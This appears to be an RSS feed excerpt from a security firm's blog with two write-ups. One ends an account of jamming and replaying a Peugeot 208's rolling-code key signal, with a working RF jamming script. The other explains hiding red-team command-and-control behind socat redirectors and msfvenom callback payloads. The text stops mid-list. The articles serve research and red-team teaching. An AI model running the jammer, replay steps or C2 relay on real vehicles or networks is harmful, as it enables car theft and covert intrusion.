&lt;p&gt;The  basic “Rolljam Attack” - that’s how various blogs online call it - is based on forcing the victim to send 2 (instead of 1) opening signals, intercepting them in a way that the owner of the car will not notice that one of the two codes has been stolen and is ready to be used. Also, the attacker needs to be close enough to the car so that the signal can be both sent and received.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3-1-edited.png&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 3 - Basic functionality of a general Keyfob.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The key of such attack is &lt;strong&gt;Jamming&lt;/strong&gt;, sending a strong signal that blocks the car receiver from detecting the message sent from the keyfob.&lt;/p&gt;
&lt;p&gt;Since the frequency of a signal depends on different factors, some of which are casual - like the temperature - the receiver has a range of accepted frequencies, also called bandwidth.&lt;/p&gt;
&lt;p&gt;The Jamming signal must be sent within the car’s receiving window (or bandwidth), at a slightly moved frequency from the one used from the keyfob.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/4.png&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 4 - A representation of a Rolling Code Bypass attack, showing the jamming frequency within the car receiving window.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The tricky part of the attack is that, while jamming, the attacker has to be able to detect and filter the signal sent by the owner of the car trying to open his vehicle. If the attacker is able to do so, the rest of the path is just a matter of implementation.&lt;/p&gt;
&lt;p&gt;Looking at Figure 4, we can clearly see all the signals we are dealing with: the &lt;strong&gt;Jamming&lt;/strong&gt; signal (Green), slightly moved from the actual frequency used from the &lt;strong&gt;keyfob&lt;/strong&gt; (Pink), both within the car receiving window (Red).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/5.png&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 5 - A device jamming and storing the first code simultaneously.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Once the first code has been stored from the device used by the attacker (that usually is a computer with some radio dongles) and not received by the car because of the jamming, the owner of the car will think that the car did not received the signal because of other reasons and will try to open it again. While clicking the button the second time, the device will store the second signal, stop jamming and send the first signal in a matter of milliseconds.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/6.png&#34; alt=&#34;6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 6 - A device jamming and storing the second code simultaneously.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/7-edited.png&#34; alt=&#34;7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 7 - A device sending the 1st code received, opening the car.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The car will receive the 1st signal from the device and open and the owner will think that now everything worked properly, but the reality is that the attacker will still own the 2nd code able to open the car.&lt;/p&gt;
&lt;h1&gt;Implementation&lt;/h1&gt;&lt;p&gt;In this example, I will explain how I hacked into a Peugeot 208 from 2020 that implements rolling code. Since the key to the rolling code attack and the most difficult part of its bypass is the ability to jam and record at the same time, I will focus on the explanation of such functionality, skipping the rest of the process since it is only a matter of implementation and it is easily replicable.&lt;/p&gt;
&lt;p&gt;Note that the car and keyfob communicate at a frequency of 433.92 MHz.&lt;/p&gt;
&lt;p&gt;After several tests and implementations that ended up being not functional, I reached a proper one using the Yard Stick One to jam and the HackRF to deal with the unlocking signals sent from the keyfobs.&lt;/p&gt;
&lt;p&gt;Here’s the really simple Python3 script I wrote to jam the signal:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;rflib&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RfCat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setFreq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;433800000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setMdmModulation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOD_ASK_OOK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setMdmDRate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4800&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Starting&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RFxmit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x17\x17\x17\x17\x17\x17\x17\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As you can see from the script, the jamming frequency is set at 433.80 MHz, exactly 120 kHz below the frequency used by the keyfob but still in the range accepted by the car.&lt;/p&gt;
&lt;p&gt;Once the script is run, the car won’t be able to receive other signals and will keep being closed even if the owner clicks the opening button.&lt;/p&gt;
&lt;p&gt;Meanwhile we are jamming, we need to use a tool able to both record and send signals from my laptop. I personally found &lt;em&gt;GNU Radio&lt;/em&gt; the best tool to do so, and I wrote two scripts, one to record and the other one to replay the signal recorded.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/8-1024x555.png&#34; alt=&#34;8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 8 - 1st script used to save the signal received in a file.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The first script is made of a &lt;em&gt;osmocom&lt;/em&gt; [5] Source block that is set to work with the HackRF, recording a signal at a central frequency of 433.92MHz with a bandwidth of 100 kHz. The bandwidth setting will allow the HackRF to cut out the jamming signal, cleaning it and recording only the part we need (the actual keyfob opening signal). It will then send it to a live GUI that will show us the peaks in the frequency spectrum and save it to a file called &lt;em&gt;Peugeot_208&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;All of these must happen while the Python3 jamming script represented in the portion of code above keeps running.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/9-1024x409.png&#34; alt=&#34;9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 9 - 2nd script used to replay the signal previously saved.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Once the python script has been interrupted, the second script will grab the &lt;em&gt;Peugeot 208&lt;/em&gt; file with the filtered signal in it, multiply it and send it to both a GUI and to the HackRF, which will transmit it to the car.&lt;/p&gt;
&lt;p&gt;And here’s the magic:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/10.gif&#34; alt=&#34;10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The car will receive the signal and open.&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;[1] &lt;a href=&#34;https://en.wikipedia.org/wiki/Remote_keyless_system&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://en.wikipedia.org/wiki/Remote_keyless_system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&#34;https://en.wikipedia.org/wiki/Rolling_code&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://en.wikipedia.org/wiki/Rolling_code&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&#34;https://greatscottgadgets.com/hackrf/one/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://greatscottgadgets.com/hackrf/one/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://greatscottgadgets.com/yardstickone/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[5] &lt;a href=&#34;https://osmocom.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://osmocom.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[6] &lt;a href=&#34;https://github.com/jopohl/urh&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/jopohl/urh&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[7] &lt;a href=&#34;https://gqrx.dk/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gqrx.dk/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Obfuscating C2 During a Red Team Engagement</title>
      <link>//localhost:1313/articles/2021/07/2021-07-16-obfuscating-c2-during-a-red-team-engagement/</link>
      <pubDate>Fri, 16 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-16-obfuscating-c2-during-a-red-team-engagement/</guid>
      <description>
        
        
        &lt;h4&gt;&lt;strong&gt;By shd&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;by-shd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#by-shd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/5gxpvd-684x1024.jpeg&#34; alt=&#34;5gxpvd&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;Red Team and Magicians&amp;hellip;&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h1&gt;&lt;strong&gt;1.What is Command and Control&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;Command-and-Control (C2) infrastructure is one the most important tools in a red teamer’s arsenal. In this article, we introduce a few simple methods that red teams use to harden their C2 infrastructure. &lt;/p&gt;
&lt;p&gt;C2 comes in various forms - but regardless they all share a basic function: &lt;strong&gt;they allow the red teamer (or threat actor) to communicate with a compromised machine.&lt;/strong&gt; During an offensive campaign, testers may accumulate a number of compromised machines but it can be difficult and overwhelming to &lt;strong&gt;maintain, orchestrate, and control&lt;/strong&gt; them in large numbers. On top of this to guarantee the campaign’s longevity, malicious communications back and forth to the compromised machine must be &lt;strong&gt;secure, obfuscated, and reliable,&lt;/strong&gt; adding a further layer of complexity.&lt;/p&gt;
&lt;h2&gt;1.1 C2 in the Wild&lt;span class=&#34;absolute -mt-20&#34; id=&#34;11-c2-in-the-wild&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#11-c2-in-the-wild&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Not all C2s are born equal.&lt;/strong&gt; Leveraging the right apparatus, with particular design, is paramount to the success of the engagement. Covert offensive engagement can &lt;strong&gt;last weeks if not months when simulating a realistic, stealthy attacker&lt;/strong&gt;. This places significant demands and &lt;strong&gt;pressures on the C2 infrastructure.&lt;/strong&gt; Ethical red teamers and real-world adversaries begrudgingly share many tools and tricks. Both are purveyors of the finest C2 frameworks to manage their malicious campaign from.&lt;/p&gt;
&lt;p&gt;In the field, there are some choice C2 frameworks for red teamers. &lt;a href=&#34;https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Metasploit&lt;/strong&gt;&lt;/a&gt; is incredibly popular for it’s &lt;strong&gt;intuitive&lt;/strong&gt; use and stripped-back command line approach (script-kiddie-friendly indeed!). However, &lt;strong&gt;Metasploit&lt;/strong&gt; loses major points for its &lt;strong&gt;fragility&lt;/strong&gt; and lack of &lt;strong&gt;maintainability&lt;/strong&gt; - the red team can’t trust &lt;strong&gt;unreliable&lt;/strong&gt; tools! There are other C2 frameworks like &lt;a href=&#34;https://www.powershellempire.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;PowerShell Empire&lt;/strong&gt;&lt;/a&gt; or it’s (GUI-version) &lt;a href=&#34;https://stealthbits.com/blog/next-gen-open-source-c2-frameworks/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;successor Covenant&lt;/strong&gt;&lt;/a&gt; that offer a red team the &lt;strong&gt;malleability&lt;/strong&gt; they desire from a C2 infrastructure. However, there is a particular C2 that meets most if not all the red team’s requirements, and are the &lt;a href=&#34;https://intel471.com/blog/cobalt-strike-cybercriminals-trickbot-qbot-hancitor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;evidenced-favourite&lt;/strong&gt;&lt;/a&gt; of the adversary: &lt;strong&gt;Cobalt Strike.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;At JUMPSEC&lt;/strong&gt;  we’ve come up against adversaries who have leveraged Cobalt Strike in incredibly sneaky ways. We’ve identified some interesting detections to hunt this C2 down, however it really is a &lt;strong&gt;cat and mouse game&lt;/strong&gt;. As defenders tune and improve their monitoring controls, adversaries will shift their behaviour over time to evade detection - meaning that that defenders must identify new behaviours and techniques to monitor for. &lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Regardless of the obfuscation, C2’s must be commanded and reported back. This &lt;strong&gt;beaconing&lt;/strong&gt; is an ebb and flow that must occur and therefore is something a defender can zero in on to detect across their network. This is no easy feat of course. JUMPSEC’s &lt;strong&gt;red team and blue team work togethe&lt;/strong&gt;r to apply the innovate offensive security research from the red team in defensive context to continuously develop detection for the latest techniques.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;As criminal adversaries often choose &lt;strong&gt;Cobalt Strike as their&lt;/strong&gt; &lt;a href=&#34;https://www.recordedfuture.com/2020-adversary-infrastructure-report/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;weapon of choice&lt;/strong&gt;&lt;/a&gt;, blue teams have given it acute attention. Defensive security researchers have &lt;a href=&#34;https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;devoted entire reports&lt;/strong&gt;&lt;/a&gt; to detecting Cobalt Strike C2 communication! The uncomfortable attention of the blue team has compelled red team operators to ensure that their C2 infrastructure is &lt;strong&gt;customised&lt;/strong&gt; for each assessment, remains &lt;strong&gt;covert&lt;/strong&gt;, and should elude blue team sight for an extended period.&lt;/p&gt;
&lt;p&gt;In this article, we share some &lt;strong&gt;red team tips&lt;/strong&gt; on &lt;strong&gt;hardening&lt;/strong&gt; command-and-control that ensure offensive engagements remain &lt;strong&gt;flexible, reliable, and elusive.&lt;/strong&gt; There are many ways to harden one&amp;rsquo;s C2 infrastructure. Let&amp;rsquo;s zero in on one particular component - &lt;strong&gt;redirectors&lt;/strong&gt; - which we have found are rather important for obfuscation.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;2. Redirectors&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-redirectors&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-redirectors&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;2.1 What is a Redirector?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;21-what-is-a-redirector&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#21-what-is-a-redirector&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Redirectors are an essential component for advanced red teaming. Redirectors allow malicious traffic to come and go as it pleases, but remain &lt;strong&gt;hidden from detection&lt;/strong&gt;. The objective of a redirector is to &lt;strong&gt;mask the core C2 infrastructure from prying blue team eyes&lt;/strong&gt;, and allow the red team operator &lt;strong&gt;hidden communication with a compromised machine&lt;/strong&gt;. Redirectors seek to mask and protect their backend server, the main orchestration server for all C2.&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_10-55-1024x572.png&#34; alt=&#34;2021 07 16 10 55&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;Simplified, but you get the idea&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Redirectors offer many advantages around obfuscation but they also offer a &lt;strong&gt;resilience&lt;/strong&gt; and &lt;strong&gt;persistence&lt;/strong&gt; advantage. If the blue team are able to successfully identify and block an IP address associated with the C2 infrastructure, the red team operator can quickly spin up a redirector and continue to keep the core backend server IP address hidden. &lt;/p&gt;
&lt;h3&gt;2.2 Example of C2 without a Redirector&lt;span class=&#34;absolute -mt-20&#34; id=&#34;22-example-of-c2-without-a-redirector&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#22-example-of-c2-without-a-redirector&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To understand the benefit of a redirector, let’s demonstrate how easy an attentive blue team defender can shut down and ruin a red team engagement that uses a vanilla C2. &lt;/p&gt;
&lt;p&gt;We can use &lt;strong&gt;msfvenom&lt;/strong&gt; to generate a payload that doesn’t do anything special, it simply creates an executable that will call back to our C2 server. There’s no obfuscation, no clever C2-over-DNS techniques, no redirection - &lt;strong&gt;nothing!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-02.png&#34; alt=&#34;2021 07 16 11 02&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If we take this C2 payload and execute it on a machine, we will inevitably be caught by any blue team worth their salt. Using &lt;strong&gt;netstat&lt;/strong&gt; on the target machine, from a defender’s perspective it’s clear to see the machine is currently communicating to a strange and new IP address on port 8080, based on an unusual executable (C2test.exe).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-02_1.png&#34; alt=&#34;2021 07 16 11 02 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This would invariably stand out to a defender as suspicious - they would not recognise the executable (even if it was called something less obvious) and would not recognise the private IP in the conversation. The blue team would quarantine the machine and sever the malicious connection we worked so hard to establish.&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;3. Redirectors save the Red Team’s day&lt;/strong&gt; &lt;/h1&gt;&lt;p&gt;The above is a textbook example of red team bad practice. A better approach is to use &lt;strong&gt;redirectors&lt;/strong&gt; to prevent the infrastructure from being exposed at the first hurdle.&lt;/p&gt;
&lt;p&gt;There are a plethora of redirection techniques, and we couldn’t possibly spoil all of our own fun by sharing them (the blue team can read too you know?). We’ll focus on the technical approach behind network traffic redirection. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.1 Dumb Pipe Redirection&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;31-dumb-pipe-redirection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#31-dumb-pipe-redirection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Dumb pipe redirection does exactly what it says on the tin. It blindly forwards our malicious traffic from node to node, but lacks sophistication for controlling the traffic. It does however allow us to obfuscate the IP of the core server, so that’s all that matters for now.&lt;/p&gt;
&lt;p&gt;To achieve dumb pipe redirection we can rely on &lt;strong&gt;socat,&lt;/strong&gt; with different &lt;strong&gt;firewall&lt;/strong&gt; implementations to improve it.  &lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.1.1 Socat&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;311-socat&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#311-socat&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following socat command would be run on our &lt;strong&gt;burnable redirector server&lt;/strong&gt; to enable  dumb pipe redirection towards our C2 server. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo socat TCP4-LISTEN:8080,fork TCP:c2address:PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-09.png&#34; alt=&#34;2021 07 16 11 09&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This allows TCP network traffic on port 8080 of the &lt;strong&gt;redirection&lt;/strong&gt; &lt;strong&gt;machine&lt;/strong&gt; to communicate on port 8080 of the &lt;strong&gt;C2 server.&lt;/strong&gt; So now our C2 server can communicate with our disposable redirection server, we now need to put the compromise machine in communication with the redirection server. This then allows a nice &lt;strong&gt;chain of communication from C2 server, to redirector, to compromised machine,&lt;/strong&gt; which remains hidden from the eyes of defenders. &lt;/p&gt;
&lt;p&gt;We now need to generate a payload that will complete the link in the chain and allow the compromised machine to communicate to our redirect server, the middle-man.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-10.png&#34; alt=&#34;2021 07 16 11 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can take this executable payload and detonate it on the target machine.When executed, it connects to our redirector server, which then forwards TCP port 8080 to our core C2 server blindly. In the screenshot below, we can see that there is a three-machine relay for communication: the top image shows the &lt;strong&gt;172.16.15.135&lt;/strong&gt; target machine in communication with the &lt;strong&gt;redirector&lt;/strong&gt; &lt;strong&gt;server&lt;/strong&gt; on &lt;strong&gt;x.x.13.49:8080,&lt;/strong&gt; the redirector machine is then in communication with the &lt;strong&gt;C2 server&lt;/strong&gt; on &lt;strong&gt;x.x.x.223:8080&lt;/strong&gt;. If the blue team catch us now, &lt;strong&gt;all we will lose is the redirector server&lt;/strong&gt; and not our core infrastructure.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-11-1024x835.png&#34; alt=&#34;2021 07 16 11 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3.1.2 Socat and Uncomplicated Firewall&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;312-socat-and-uncomplicated-firewall&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#312-socat-and-uncomplicated-firewall&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;There is, however, one &lt;strong&gt;disavantadge&lt;/strong&gt; to this method of &lt;strong&gt;socat dumb pipe redirection&lt;/strong&gt;. Anyone with the &lt;strong&gt;redirector&amp;rsquo;s&lt;/strong&gt; &lt;strong&gt;IP&lt;/strong&gt; &lt;strong&gt;address&lt;/strong&gt; can now connect to our listener via the specified port. Let’s illuminate this using the network scanning tool &lt;strong&gt;nmap,&lt;/strong&gt; which shows that we’re running a &lt;strong&gt;proxy&lt;/strong&gt; (the redirector). A defender would definitely notice if there was an unrecognised web proxy in communication with a machine in their internal network. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-12-1024x248.png&#34; alt=&#34;2021 07 16 11 12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;To avoid this situation, let’s maker our dumb pipe redirector a bit smarter. We can configure a &lt;strong&gt;firewall&lt;/strong&gt; that will protect our infrastructure and allow only the redirector to directly connect. In this case, we&amp;rsquo;re going to use &lt;strong&gt;ufw&lt;/strong&gt;, which stands for &lt;strong&gt;Uncomplicated Firewall&lt;/strong&gt; and is available for a variety of UNIX distributions. &lt;/p&gt;
&lt;p&gt;Let’s configure UFW on our &lt;strong&gt;core C2 server&lt;/strong&gt; and &lt;strong&gt;redirector server&lt;/strong&gt; to allow for traffic monitoring:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Let’s configure Port &lt;strong&gt;22&lt;/strong&gt;, which is usually reserved for SSH services. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
